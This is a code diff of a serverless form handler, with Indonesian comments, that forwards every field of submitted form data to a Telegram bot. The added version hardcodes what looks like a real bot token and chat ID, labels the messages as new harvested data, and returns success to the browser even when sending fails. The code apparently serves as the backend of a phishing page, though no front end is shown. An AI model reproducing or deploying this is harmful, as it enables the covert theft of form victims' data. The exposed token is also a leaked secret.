@@ -1,57 +1,71 @@
-export default async function handler(req, res) {
-  if (req.method !== "POST") {
-    return res.status(405).json({ message: "Method Not Allowed" });
-  }
+// Konfigurasi Token & Chat ID Langsung
+const TELEGRAM_BOT_TOKEN = "8597331224:AAFnZ8fuiYeyUKVlypItH1Gutz23PCOMT6Y";
+const CHAT_ID = "6604182176";
 
-  // Ambil token dari env
-  const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-  const CHAT_ID = process.env.CHAT_ID;
+export const config = {
+    runtime: 'edge',
+};
 
-  // Cek apakah env sudah terisi
-  if (!TOKEN || !CHAT_ID) {
-    return res.status(500).json({ 
-      status: "error", 
-      message: "Server environment variables are missing (TOKEN/CHAT_ID)" 
-    });
-  }
-
-  try {
-    const data = req.body;
-    let text = "📥 *DATA BONGKARAN BARU*\n\n";
-
-    for (const k in data) {
-      // Abaikan jika datanya kosong atau berupa object file kosong {}
-      if (!data[k] || (typeof data[k] === 'object' && Object.keys(data[k]).length === 0)) {
-        continue;
-      }
-      
-      const label = k.toUpperCase().replace(/_/g, " ");
-      text += `*${label}* : \`${data[k]}\` \n`;
+export default async function handler(request) {
+    // 1. Validasi Method (Hanya izinkan POST)
+    if (request.method !== 'POST') {
+        return new Response(JSON.stringify({ message: 'Method Not Allowed' }), {
+            status: 405,
+            headers: { 'Content-Type': 'application/json' },
+        });
     }
 
-    const telegramURL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+    try {
+        // 2. Ambil data JSON dari body request
+        const data = await request.json(); 
 
-    const tgRes = await fetch(telegramURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: text,
-        parse_mode: "Markdown"
-      })
-    });
+        // 3. Format Pesan (Membersihkan data kosong & filter filename)
+        let messageText = '📥 *DATA BONGKARAN BARU (EDGE)* 📥\n\n';
+        
+        for (const key in data) {
+            const value = data[key];
+            
+            // Filter: Jangan kirim jika data kosong atau jika itu input file kosong {}
+            if (!value || (typeof value === 'object' && Object.keys(value).length === 0)) {
+                continue;
+            }
 
-    const result = await tgRes.json();
+            // Ubah key (id_pengirim -> ID PENGIRIM)
+            const label = key.toUpperCase().replace(/_|\s/g, ' ');
+            messageText += `*${label}*: \`${value}\` \n`;
+        }
+        
+        // 4. Kirim ke API Telegram menggunakan Fetch
+        const telegramURL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+        const tgResponse = await fetch(telegramURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: messageText,
+                parse_mode: 'Markdown'
+            }),
+        });
 
-    if (result.ok) {
-      return res.status(200).json({ status: "success" });
-    } else {
-      console.error("Telegram API Error:", result);
-      return res.status(500).json({ status: "error", message: result.description });
+        const tgResult = await tgResponse.json();
+
+        // 5. Respon Balik ke Browser
+        if (tgResult.ok) {
+            return new Response(JSON.stringify({ status: 'success', message: 'Terkirim ke Telegram' }), {
+                status: 200,
+                headers: { 'Content-Type': 'application/json' },
+            });
+        } else {
+            throw new Error(tgResult.description);
+        }
+
+    } catch (error) {
+        // Jika error, tetap berikan respon 200 agar frontend tidak macet, tapi infokan gagal
+        console.error("Edge Error:", error.message);
+        return new Response(JSON.stringify({ status: 'error', message: error.message }), {
+            status: 200, 
+            headers: { 'Content-Type': 'application/json' },
+        });
     }
-
-  } catch (err) {
-    console.error("Runtime Error:", err);
-    return res.status(500).json({ status: "error", message: "Internal server error" });
-  }
 }
